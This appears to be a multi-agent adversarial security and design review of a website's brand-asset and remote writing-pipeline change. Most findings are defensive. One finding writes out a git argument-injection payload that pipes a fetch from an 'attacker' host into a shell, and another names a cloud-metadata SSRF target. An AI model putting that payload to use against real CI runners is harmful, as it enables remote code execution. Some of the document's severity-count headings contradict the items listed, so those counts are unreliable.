# Consolidated Adversarial Review — `add-brand-assets-and-writing-pipeline`

**Target:** OpenSpec change at `openspec/changes/add-brand-assets-and-writing-pipeline/`
**Reviewers:** 4 parallel adversarial sub-agents (security, supply-chain/ops, openspec-authoring, domain-completeness).
**Date:** 2026-05-01
**Files reviewed:** `proposal.md`, `design.md`, `tasks.md`, 4 capability deltas under `specs/`.

> All four reviewers returned **APPROVE-WITH-CHANGES**. No reviewer recommended BLOCK. `openspec validate --strict` passes; findings are correctness/completeness gaps the strict validator does not catch.

---

## Critical (1)

### C1 · Diagrams in remote MDX explicitly excluded — breaks DESIGN.md §4.12 promise

**Source:** Domain (F6) · `proposal.md:56`, DESIGN.md §4.12 lines 510–520.
DESIGN.md §4.12 makes Mermaid + D2 + SVG diagrams load-bearing for the long-form reader. This change excludes "remote-source diagrams" — meaning a contributor at `artagon/content` who writes a post with ` ```mermaid ` will silently render as an unrendered code block. The user's "render in widget on PR-merge" promise breaks for any post containing a diagram.
**Fix:** Either (a) lift the exclusion (the same `astro:mdx` pipeline already processes remote MDX, so Mermaid/D2 compilation is mostly free), or (b) Zod-reject remote posts containing fenced `mermaid`/`d2` blocks with a precise build error pointing to `docs/writing-pipeline.md`. Surface restriction prominently in the doc.

---

## High / BLOCKING (10, deduped — 12 sub-agent flags)

### H1 · `git clone --branch <SHA>` is invalid — every webhook dispatch will fail

**Source:** Security (F1) + Supply-chain (F1) · `tasks.md:45`, `design.md:86`, `specs/site-writing-pipeline/spec.md:5`.
`git clone --branch` only accepts branch and tag names. The dispatch sends a 40-hex SHA → `WRITING_REMOTE_REF` → clone exits 128 every time.
**Fix:** Mandate `git init && git remote add origin … && git -C <dir> fetch --depth 1 --filter=blob:none origin <SHA> && git -C <dir> checkout FETCH_HEAD`. Allow `--branch` only when `WRITING_REMOTE_REF` matches `refs/heads/*` or `refs/tags/*`. Update spec L5, design L86, tasks 5.1; add a scenario covering both forms.

### H2 · `client_payload.ref` argument injection

**Source:** Security (F2) · `specs/site-writing-pipeline/spec.md:38`, `tasks.md:60-61`.
Spec validates `sha` as 40-hex but only "validates" `ref` without a regex. Unsanitized `ref` reaching a shell-expanded `git clone --branch "$REF"` enables payloads like `--upload-pack=curl attacker|sh` (CVE-2017-1000117 family) for runner RCE.
**Fix:** Drop `ref` entirely (the SHA is sufficient), or constrain to `^refs/(heads|tags)/[A-Za-z0-9._/-]{1,200}$` AND pass via `--` boundary; never interpolate dispatch fields into shell.

### H3 · No verification that dispatch originated from `artagon/content`

**Source:** Security (F3) · `proposal.md:64`, `design.md:91-103`, `specs/site-writing-pipeline/spec.md:36`.
`repository_dispatch` only authenticates the PAT holder, not the source repo. Anyone with a leaked PAT scoped to `artagon/artagon-site:dispatches` can fire `pull-request-merged` with any `sha`/`repo` they choose.
**Fix:** Workflow MUST hardcode `WRITING_REMOTE_REPO=artagon/content` (ignore any `client_payload.repo`); reject if `client_payload.sha` is not reachable via `git ls-remote https://github.com/artagon/content` before clone.

### H4 · Build-host SSRF via remote `cover` frontmatter

**Source:** Security (F4) · `specs/site-content/spec.md:3-5`, proposal Out-of-Scope §"Image transformations".
Schema gains `repo`/`path`/`commit` but does not constrain `cover`. Astro `<Image>` with an absolute URL fetches at build time; a malicious post can set `cover: https://169.254.169.254/...` to exfiltrate AWS metadata or probe internal hosts from the runner.
**Fix:** Extend Zod for remote posts: `cover` matches `^(\.\/assets\/|posts\/assets\/)`; reject absolute URLs and parent-traversal.

### H5 · Astro MDX `components` config does NOT enforce an allowlist

**Source:** Security (F5) + OpenSpec authoring (F8) · `design.md:109-111`, `specs/site-writing-pipeline/spec.md:69-77`.
Astro's `components` prop maps known names to implementations; unknown JSX names fall through and render as plain HTML elements (e.g., `<UntrustedThirdPartyWidget>` becomes a no-op custom element). The "fails build at parse time" claim is false in default MDX behavior. Two reviewers independently flagged this.
**Fix:** Add a remark/rehype plugin (or pre-build AST walker) that rejects MDX JSX nodes whose name is not in `['StandardChip', 'StandardsRow', 'TrustChain', 'Diagram', 'Callout']`; cite the plugin path in the requirement and add a Phase task to install it.

### H6 · `repo` frontmatter format unbounded → phishing via "Edit on GitHub"

**Source:** Security (F6) · `specs/site-content/spec.md:3`, `specs/site-writing-pipeline/spec.md:55-62`.
"format `<owner>/<repo>`" matches `evil/repo`; "Edit on GitHub" link points users at attacker-controlled repos. Trust amplified because URL is `github.com`.
**Fix:** Schema becomes `repo: z.enum(['artagon/content'])` (or read-only equal to `WRITING_REMOTE_REPO`); reject non-allowlisted owners.

### H7 · Sparse-checkout ordering is wrong; partial-clone benefit lost

**Source:** Supply-chain (F2) · `specs/site-writing-pipeline/spec.md:5`, `design.md:86`.
Without `--sparse` plus `--no-checkout` and post-clone `git sparse-checkout set` BEFORE checkout, the clone materializes the full tree and pulls every blob ≤ 10 MB. `blob:limit=10m` still pulls non-post binaries.
**Fix:** Spec the exact sequence: `git clone --no-checkout --depth 1 --filter=blob:none --sparse <url> <dir> && git -C <dir> sparse-checkout set posts/ && git -C <dir> checkout`. Switch to `blob:none` since posts are markdown.

### H8 · `content-redeploy.yml` lacks `concurrency:`; deploys race

**Source:** Supply-chain (F3) + Security (F11) · `tasks.md:7.1`; existing `deploy.yml` already uses `concurrency: { group: pages, cancel-in-progress: true }`.
N rapid dispatches launch N parallel builds; slowest wins on Pages, producing non-monotonic deploys. Webhook DoS is the same finding from a different angle.
**Fix:** Workflow MUST set `concurrency: { group: 'pages', cancel-in-progress: true }`. Add Requirement + scenario.

### H9 · DESIGN.md §4.14 variant coverage incomplete (8 of 13)

**Source:** Domain (F1, F2) · `specs/site-brand-gallery/spec.md:10`; `design.md:42-48`.
DESIGN.md §4.14 enumerates 13 variants. The gallery requirement only mandates 8. Missing: **avatar-twilight, avatar-paper, avatar-transparent, favicon-bold, apple-touch (composite), og-paper**. The `BrandSvgs` interface omits `bold` (load-bearing for ≤32px per §4.14), avatar tiles (composites, not raw glyphs), and `paper` OG theme. The user said "make sure ALL artifacts are getting adopted" — six fall through.
**Fix:** Extend `GlyphVariant` union to include `bold`; add an `Avatar` factory taking `{glyph, background, size}`; add `paper` to `ogCard` theme union; update gallery scenario to enumerate all 13. Phase 2.1a sub-task.

### H10 · MODIFIED-vs-ADDED inconsistency on `site-content` & `site-branding`

**Source:** OpenSpec authoring (F1, F3) · `proposal.md:74-75`, `specs/site-content/spec.md:1`, `specs/site-branding/spec.md:1`.
Proposal says these are MODIFIED; deltas use only `## ADDED Requirements`. Same pattern bug as `adopt-design-md-format`. Worse: this change ADDs `path`+`commit` to writing schema while the redesign ADDs `repo` to the same schema — at archive merge, the spec gets two duplicate-purpose requirement blocks instead of one coherent `Per-route Frontmatter Contract`.
**Fix:** (a) Update proposal Impact lines to "ADDED-TO" rather than "MODIFIED" where appropriate. (b) Convert this change's frontmatter requirement to `## MODIFIED Requirements` referencing the redesign's exact `Per-route Frontmatter Contract` header so the archive merger replaces in place.

### H11 · End-to-end PR-merge → visible-deploy contract not specified

**Source:** Domain (F7) · `specs/site-writing-pipeline/spec.md:36-53`.
Spec defines individual steps (dispatch validation, clone, build) but no end-to-end requirement: latency target, visible signal of success, failure-recovery. User said "when PR is merged to main and deployed" — but a contributor merging has no way to know "is it live yet?"
**Fix:** Add Requirement "End-to-End Merge-to-Visible Latency": from PR-merge in `artagon/content` to live `/writing/[slug]` MUST complete within 10 minutes (P95). Deployed page footer MUST contain `<meta name="artagon:build-sha">` matching `WRITING_REMOTE_REF`. Workflow MUST post a status-check back to the content-repo PR.

### H12 · OG card pipeline duplication risk

**Source:** Domain (F5) · `proposal.md:38`, redesign `site-branding`.
Two OG pipelines: redesign's per-slug satori vs this change's static `og-image.png`. Spec is silent on interaction.
**Fix:** Static `og-image.png` is the site-wide default; per-slug satori-generated images override it on routes that opt in. Add to `site-branding` delta.

### H13 · `verify:writing-prerequisites` bootstrap order — Phase 0 needs script Phase 5 builds

**Source:** OpenSpec authoring (F4) · `tasks.md:7,50`; `design.md:117`.
Phase 0.1 says the script "checks both" prerequisites; Phase 5.6 builds it. Phase 0 cannot pass on a fresh clone.
**Fix:** Move `verify:writing-prerequisites.mjs` build to Phase 0.4 (write the script first); add a unit test that the script fails when only one prerequisite is archived.

### H14 · "All artifacts adopted" not enumerated explicitly

**Source:** Domain (F15) · `proposal.md:11-29`.
The user said "make sure ALL artifacts are getting adopted." Proposal lists what IS in scope but never inventories `new-design/extracted/` against the change. Items potentially missed: `new-design/extracted/src/data/roadmap.ts`, build scripts, `explorations/`, `migration/`.
**Fix:** Add an Appendix to `proposal.md`: "Inventory of `new-design/extracted/`" with each top-level item marked Adopted-In-This-Change, Adopted-In-Redesign, or Not-Applicable. Audit trail for "all artifacts."

---

## Medium (10 — abbreviated)

| ID  | Dim          | Summary                                                                      | Fix one-liner                                                                                                                           |
| --- | ------------ | ---------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------- |
| M1  | Security     | sharp + remote SVG → external-href fetch at build (SSRF)                     | Add Requirement: SVG factories MUST NOT contain `<image>`, `<use href="http">`, external `xlink:href`; ast-grep rule on `brand-svgs.ts` |
| M2  | Security     | Inline-glyph ban scope gap (CSS data: URIs, raw blocks, alternate viewBoxes) | Broaden ast-grep rule patterns; add `data:image/svg+xml` regex sweep; document scope in rule's `note:`                                  |
| M3  | Security     | `.cache/content-repo/` staleness leaks embargoed content                     | `fetch-content.mjs` MUST `rm -rf .cache/content-repo` before clone; pre-commit blocks `git add .cache/`                                 |
| M4  | Security     | `CONTENT_DISPATCH_TOKEN` rotation policy missing                             | Fine-grained PAT, ≤90-day expiry, rotation runbook in `docs/writing-pipeline.md`; revoke + remove workflow within 1h on suspected leak  |
| M5  | Supply-chain | Default `artagon/content` repo doesn't exist (gh api 404)                    | Defer default to empty string until repo exists, OR add `WRITING_REMOTE_FAIL_OPEN=1` for local dev                                      |
| M6  | Domain       | Tweaks panel (DESIGN.md §4.10) — owned by which change?                      | Add explicit "Out of Scope: Tweaks panel — owned by `update-site-marketing-redesign`" with cross-ref                                    |
| M7  | Domain       | Local dev parity with CI undefined                                           | Add `predev` lifecycle hook calling `npm run fetch:content` (no-op when env empty)                                                      |
| M8  | Domain       | Bootstrapping/empty-state when both local and remote yield zero posts        | Extend "Empty env" scenario with parallel "Zero-post case": `/writing` renders empty-state, widget hides, `feed.xml` is empty-but-valid |
| M9  | Domain       | Future-dated / scheduled posts handling unspecified                          | Add Requirement: posts with `published > buildDate` excluded from collections, build does not fail                                      |
| M10 | Domain       | Writing widget extends only 1 of 6 placements                                | Generalize: ALL placements (`h1, a, b, c, d`) detect remote-source posts and render source-repo link uniformly                          |
| M11 | Authoring    | `site-content` Purpose still "TBD" after multiple ADDs                       | Add Phase 10 task to rewrite `site-content` Purpose at archive                                                                          |
| M12 | Authoring    | Glyph parity snapshot has no DESIGN.md change-detection                      | CI check: snapshot regenerated MUST be accompanied by DESIGN.md edits                                                                   |

---

## Low (8 — abbreviated)

| ID  | Dim          | Summary                                                                                |
| --- | ------------ | -------------------------------------------------------------------------------------- |
| L1  | Security     | `/brand` copy-button island CSP coverage (advisory)                                    |
| L2  | Security     | Clipboard payload XSS-when-pasted if factory inputs ever take user-controlled values   |
| L3  | Supply-chain | `.cache/content-repo/` not cached across CI runs                                       |
| L4  | Supply-chain | Committed PNG growth long-term; consider git-LFS in follow-up                          |
| L5  | Supply-chain | Lockfile note for `adopt-design-md-format` integrity check                             |
| L6  | Authoring    | `site-brand-gallery` borderline as separate capability — document why in design.md     |
| L7  | Authoring    | Decisions #6, #9 are descriptions, not decisions (no alternatives-considered)          |
| L8  | Authoring    | Open Questions claim "all decided" but candidates not enumerated                       |
| L9  | Authoring    | Site-branding scenario describes `set:html` while admitting it's banned                |
| L10 | Authoring    | `/brand` "MUST be added to NOINDEX_ROUTES" phrasing ambiguous against `as const` tuple |
| L11 | Authoring    | Tasks 0.3, 1.2, 1.3, 8.x lack falsifiable acceptance signals                           |
| L12 | Domain       | "Edit on GitHub" UX flow undefined (read-only at SHA → fork-and-PR)                    |
| L13 | Domain       | Remote posts in RSS feed unspecified                                                   |
| L14 | Domain       | `public/assets/logos/README.md` (the contract) — does it move?                         |
| L15 | Domain       | Source `brand-icons.html` itself: adopted or discarded after extraction?               |

---

## Cross-dimensional patterns

- **`git clone --branch <SHA>` flagged independently by Security (F1) and Supply-chain (F1).** The most-cited finding across all 4 dimensions. Single fix closes both.
- **MDX allowlist not enforced** flagged by Security (F5) and OpenSpec authoring (F8). Single remark/rehype plugin closes both.
- **Schema collision with redesign change** flagged by OpenSpec authoring (F1, F3) and partially by Domain (F11 future-dated). The MODIFIED-vs-ADDED-vs-archive-ordering pattern is the same bug we hit on `adopt-design-md-format`.
- **DESIGN.md §4.12/§4.14 fidelity gaps** flagged by Domain (F1, F2, F6) and indirectly by Security (factory inputs F13). The user's "all artifacts adopted" promise needs an explicit inventory.
- **Webhook flow correctness** is the most-fragile surface: 5 of 14 must-fixes (H1, H2, H3, H7, H8) all touch the same workflow file.

---

## Summary

| Dimension           | Critical | High   | Medium | Low    | Verdict                                         |
| ------------------- | -------- | ------ | ------ | ------ | ----------------------------------------------- |
| Security            | 0        | 6      | 4      | 3      | APPROVE-WITH-CHANGES (6 must-fix)               |
| Supply-chain & ops  | 0        | 3      | 2      | 3      | APPROVE-WITH-CHANGES (3 must-fix, all BLOCKING) |
| OpenSpec authoring  | 0        | 2      | 2      | 8      | APPROVE-WITH-CHANGES (4 must-fix)               |
| Domain completeness | 1        | 4      | 4      | 4      | APPROVE-WITH-CHANGES (5 must-fix)               |
| **Total (deduped)** | **1**    | **14** | **12** | **15** | **APPROVE-WITH-CHANGES**                        |

Net unique must-fix items (Critical + High, deduped across dimensions): **15**.

---

## Recommendation

Apply the **15 must-fix amendments** as a single edit pass on `proposal.md`, `design.md`, `tasks.md`, and the affected capability deltas. Re-run `openspec validate --strict add-brand-assets-and-writing-pipeline`. The 12 mediums and 15 lows can batch into a single follow-up commit on the same change branch.

No reviewer recommends rejecting the change. Most must-fixes cluster on:

1. The webhook → git-clone flow (H1, H2, H3, H7, H8) — single workflow file.
2. Remote-content security (H4, H5, H6) — Zod schema + remark plugin.
3. Brand variant completeness (H9) — extend `BrandSvgs` interface.
4. Authoring hygiene (H10, H13) — same patterns as `adopt-design-md-format`.

The Critical (C1 — diagrams in remote MDX) is the single architectural call: lift the exclusion (small effort, the pipeline is already there) or hard-fail builds on diagram-bearing remote posts. Recommend lifting.
